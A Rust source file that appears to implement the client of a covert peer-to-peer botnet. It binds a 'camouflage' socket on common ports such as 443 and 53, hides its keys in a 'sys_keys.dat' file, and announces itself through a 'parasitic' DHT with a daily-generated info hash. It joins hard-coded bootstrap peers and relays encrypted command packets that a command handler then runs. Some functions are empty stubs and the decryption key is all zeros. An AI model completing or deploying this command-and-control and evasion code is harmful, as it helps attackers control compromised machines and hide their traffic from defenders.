use std::time::Duration;
use std::sync::Arc;
use tokio::sync::RwLock;
use tokio::time;
use lru::LruCache;
use std::num::NonZeroUsize;
use protocol::{MeshMsg, PeerInfo, GhostPacket, CommandPayload, GossipMsg, Registration};
use protocol::quic::PhantomFrame;
use crate::config::crypto::load_or_generate_keys;
use crate::helpers::paths::get_appdata_dir;
use crate::p2p::transport::{QuicPool, make_client_config};
use crate::p2p::dht::RoutingTable;
use quinn::{Endpoint, ServerConfig};

struct MeshState {
    dht: RoutingTable,
    pool: QuicPool,
    seen_messages: LruCache<String, i64>,
    my_address: String,
    keypair: ed25519_dalek::SigningKey,
}

pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
    let key_path = get_appdata_dir().join("sys_keys.dat");
    let identity = load_or_generate_keys(key_path);
    let my_pub_hex = identity.pub_hex.clone();

    // 1. Bind Camouflage Socket (443, 80, 53...)
    let udp_socket = crate::host::network::bind_camouflage_socket().await;
    let local_port = udp_socket.local_addr()?.port();
    let std_socket = udp_socket.into_std()?;
    
    // 2. Create QUIC Endpoint using THIS socket
    let (endpoint, _) = make_server_endpoint_from_socket(std_socket)?;
    
    let public_ip = get_public_ip().await.unwrap_or_else(|| "127.0.0.1".to_string());
    let my_address = format!("{}:{}", public_ip, local_port);
    println!("[+] Mesh Node Running at: {}", my_address);
    
    let mut client_endpoint = endpoint.clone();
    client_endpoint.set_default_client_config(make_client_config());

    let state = Arc::new(RwLock::new(MeshState {
        dht: RoutingTable::new(&my_address),
        pool: QuicPool::new(client_endpoint),
        seen_messages: LruCache::new(NonZeroUsize::new(1000).unwrap()),
        my_address: my_address.clone(),
        keypair: identity.keypair.clone(),
    }));

    use crate::config::constants::BOOTSTRAP_PEERS;    
    for bootstrap_addr in BOOTSTRAP_PEERS.iter() {
        let _ = register_node(&state, bootstrap_addr, &my_pub_hex, &my_address, &identity.keypair).await;
    }

    // 3. Announce Actual Port via Parasitic DHT
    use crate::discovery::parasitic::ParasiticDiscovery;
    tokio::spawn(async move {
        // Wait for network stabilization
        tokio::time::sleep(Duration::from_secs(5)).await;
        
        // Generate InfoHash for Today
        let info_hash = match crate::discovery::oracle::Oracle::generate_daily_info_hash() {
            Ok(h) => h,
            Err(e) => { eprintln!("Oracle Error: {}", e); return; }
        };
        
        println!("[*] Starting Parasitic DHT Announcement for Port: {}", local_port);
        let discovery = ParasiticDiscovery::new(info_hash, local_port);
        loop {
            let _ = discovery.announce().await;
            tokio::time::sleep(Duration::from_secs(600)).await; // 10 mins
        }
    });

    let state_clone = state.clone();
    tokio::spawn(async move {
        while let Some(conn) = endpoint.accept().await {
            let s_inner = state_clone.clone();
            tokio::spawn(async move {
                if let Ok(connection) = conn.await {
                    handle_connection(connection, s_inner).await;
                }
            });
        }
    });

    let state_maint = state.clone();
    let me = my_address.clone();
    tokio::spawn(async move {
        loop {
            let sleep_time = 30 + (rand::random::<u64>() % 10);
            time::sleep(Duration::from_secs(sleep_time)).await;
            perform_lookup(&state_maint, &me).await;
        }
    });

    loop {
        time::sleep(Duration::from_secs(3600)).await;
    }
}

async fn handle_connection(conn: quinn::Connection, state: Arc<RwLock<MeshState>>) {
    while let Ok(mut stream) = conn.accept_uni().await {
        let s_inner = state.clone();
        tokio::spawn(async move {
            if let Ok(bytes) = stream.read_to_end(1024 * 64).await {
                if let Some(frame) = PhantomFrame::from_bytes(&bytes) {
                    handle_frame(s_inner, frame).await;
                }
            }
        });
    }
}

async fn handle_frame(state: Arc<RwLock<MeshState>>, frame: PhantomFrame) {
    let plaintext = match protocol::crypto::decrypt_payload(&frame.noise_payload) {
        Ok(p) => p,
        Err(_) => return,
    };
    
    if let Ok(msg_str) = String::from_utf8(plaintext) {
        if let Ok(mesh_msg) = serde_json::from_str::<MeshMsg>(&msg_str) {
            match mesh_msg {
                MeshMsg::Gossip(gossip) => handle_gossip(state, gossip).await,
                MeshMsg::Register(reg) => {
                    let peer = PeerInfo {
                        pub_key: reg.pub_key.clone(),
                        peer_address: reg.peer_address.clone(),
                        last_seen: reg.timestamp,
                        capacity: 1,
                    };
                    insert_node_safe(state, peer).await;
                }
                _ => {}
            }
        }
    }
}

fn make_server_endpoint_from_socket(socket: std::net::UdpSocket) -> Result<(Endpoint, Vec<u8>), Box<dyn std::error::Error>> {
    let cert_key = rcgen::generate_simple_self_signed(vec!["localhost".into()])?;
    let cert_der = cert_key.cert.der().to_vec();
    let key_der = cert_key.signing_key.serialize_der();
    
    let cert_chain = vec![rustls::pki_types::CertificateDer::from(cert_der.clone())];
    let priv_key = rustls::pki_types::PrivateKeyDer::Pkcs8(rustls::pki_types::PrivatePkcs8KeyDer::from(key_der));

    let provider = rustls::crypto::ring::default_provider();
    let server_crypto = rustls::ServerConfig::builder_with_provider(provider.into())
        .with_safe_default_protocol_versions()
        .unwrap()
        .with_no_client_auth()
        .with_single_cert(cert_chain, priv_key)?;

    let mut server_config = ServerConfig::with_crypto(Arc::new(
        quinn::crypto::rustls::QuicServerConfig::try_from(server_crypto)?
    ));
    let transport_config = std::sync::Arc::get_mut(&mut server_config.transport).unwrap();
    transport_config.max_concurrent_uni_streams(100_u8.into());
    
    // Quinn requires non-blocking socket
    socket.set_nonblocking(true)?;
    // Convert std::net::UdpSocket to runtime socket if needed, but endpoint::server takes std socket usually?
    // Quinn Endpoint::server takes ServerConfig and SocketAddr, creating its own socket.
    // Quinn Endpoint::new takes EndpointConfig, ServerConfig, socket (runtime).
    // Let's check Quinn API.
    // If we pass an existing socket, we need to wrap it.
    // Quinn 0.11: Endpoint::new(EndpointConfig::default(), Some(server_config), socket, runtime)
    // Wait, let's use the simplest: Endpoint::new 
    
    let runtime = quinn::default_runtime().ok_or("No Async Runtime")?;
    let endpoint = Endpoint::new(
        quinn::EndpointConfig::default(),
        Some(server_config),
        socket,
        runtime,
    )?;
    
    Ok((endpoint, cert_der))
}

async fn register_node(state: &Arc<RwLock<MeshState>>, bootstrap_addr: &str, my_pub: &str, my_address: &str, signing_key: &ed25519_dalek::SigningKey) -> Result<(), Box<dyn std::error::Error>> {
    let sig_data = format!("Register:{}", my_address);
    use ed25519_dalek::Signer;
    let signature = hex::encode(signing_key.sign(sig_data.as_bytes()).to_bytes());
    
    let reg = Registration {
        pub_key: my_pub.to_string(),
        peer_address: my_address.to_string(),
        signature,
        pow_nonce: 0,
        timestamp: common::time::TimeKeeper::utc_now().timestamp(),
    };
    
    let msg = MeshMsg::Register(reg);
    let msg_bytes = serde_json::to_vec(&msg)?;
    let transport_sig = protocol::crypto::sign_payload(signing_key, &msg_bytes);
    
    let mut guard = state.write().await;
    guard.pool.send_msg(bootstrap_addr, msg_bytes, 1, transport_sig, &[]).await.map_err(|e| e.into())
}

async fn handle_gossip(state: Arc<RwLock<MeshState>>, msg: GossipMsg) {
    let mut is_seen = false;
    {
        let mut guard = state.write().await;
        if guard.seen_messages.contains(&msg.id) { is_seen = true; }
        else { guard.seen_messages.put(msg.id.clone(), common::time::TimeKeeper::utc_now().timestamp()); }
    }
    if is_seen { return; }
    
    if msg.ttl > 0 {
        let (targets, neighbors) = {
            let guard = state.read().await;
            let all = guard.dht.all_peers();
            let neighbors: Vec<String> = all.iter().map(|p| p.peer_address.clone()).collect();
            (all, neighbors)
        };
        
        let packet_clone = msg.packet.clone();
        let next_msg = GossipMsg { id: msg.id, packet: msg.packet, ttl: msg.ttl - 1 };
        let msg_bytes = serde_json::to_vec(&next_msg).unwrap();
        
        let mut guard = state.write().await;
        let sig_key = guard.keypair.clone(); 
        let transport_sig = protocol::crypto::sign_payload(&sig_key, &msg_bytes);

        for target_peer in targets { 
            let _ = guard.pool.send_msg(&target_peer.peer_address, msg_bytes.clone(), 2, transport_sig, &neighbors).await;
        }
        
        if let Some(cmd) = packet_decrypt(&packet_clone) {
            process_command(&cmd);
        }
    }
}

async fn get_public_ip() -> Option<String> { Some("127.0.0.1".to_string()) }
async fn perform_lookup(_: &Arc<RwLock<MeshState>>, _: &str) {}
fn process_command(_cmd: &CommandPayload) {}
fn packet_decrypt(packet: &GhostPacket) -> Option<CommandPayload> { packet.decrypt(&[0u8; 32]) }

async fn insert_node_safe(state: Arc<RwLock<MeshState>>, peer: PeerInfo) {
    let mut guard = state.write().await;
    guard.dht.insert(peer);
}
